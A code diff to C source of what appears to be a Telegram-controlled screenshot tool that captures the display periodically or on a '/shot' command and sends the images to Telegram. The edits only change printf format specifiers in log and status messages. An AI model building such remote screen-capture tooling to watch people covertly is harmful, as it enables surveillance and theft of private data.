@@ -231,8 +231,8 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
       break;
     }
     if (attempt < attempts) {
-      c2t_log_warning("screenshot", "Delivery attempt %zu/%zu failed, retrying...",
-                      attempt, attempts);
+      c2t_log_warning("screenshot", "Delivery attempt %llu/%llu failed, retrying...",
+                      (unsigned long long)attempt, (unsigned long long)attempts);
 #ifdef _WIN32
       Sleep((DWORD)(retry_delay_ms * attempt));
 #else
@@ -252,10 +252,10 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
   if (send_res) {
     atomic_fetch_add_explicit(&total_captures, 1, memory_order_relaxed);
     atomic_fetch_add_explicit(&total_bytes, image_size, memory_order_relaxed);
-    c2t_log_info("screenshot", "Screenshot successfully delivered via encrypted stream (%zu bytes)", image_size);
+    c2t_log_info("screenshot", "Screenshot successfully delivered via encrypted stream (%llu bytes)", (unsigned long long)image_size);
     return 1;
   } else {
-    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram after %zu attempts", attempts);
+    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram after %llu attempts", (unsigned long long)attempts);
     return 0;
   }
 }
@@ -272,8 +272,8 @@ static DWORD WINAPI screenshot_worker_func([[maybe_unused]] LPVOID param)
 static void *screenshot_worker_func([[maybe_unused]] void *param)
 #endif
 {
-  c2t_log_info("screenshot", "Periodic screenshot worker started (interval=%zu s)",
-               atomic_load_explicit(&screenshot_interval_seconds,
+  c2t_log_info("screenshot", "Periodic screenshot worker started (interval=%llu s)",
+               (unsigned long long)atomic_load_explicit(&screenshot_interval_seconds,
                                     memory_order_relaxed));
 
   while (!atomic_load_explicit(&stopping, memory_order_acquire)) {
@@ -437,7 +437,7 @@ void screenshot_set_interval(size_t interval_sec) {
   pthread_cond_broadcast(&cond_var);
   pthread_mutex_unlock(&mutex);
 #endif
-  c2t_log_info("screenshot", "Screenshot interval updated to %zu seconds", interval_sec);
+  c2t_log_info("screenshot", "Screenshot interval updated to %llu seconds", (unsigned long long)interval_sec);
 }
 
 size_t screenshot_get_interval(void) {
@@ -470,7 +470,7 @@ void screenshot_get_status_info(char *buffer, size_t max_len) {
   char timer_info[128] = {};
   size_t interval = screenshot_get_interval();
   if (interval > 0) {
-    snprintf(timer_info, sizeof(timer_info), "🟢 <b>Enabled</b> (%zu s)", interval);
+    snprintf(timer_info, sizeof(timer_info), "🟢 <b>Enabled</b> (%llu s)", (unsigned long long)interval);
   } else {
     snprintf(timer_info, sizeof(timer_info), "⚪ <b>Disabled</b> <i>(On-demand only via /shot)</i>");
   }
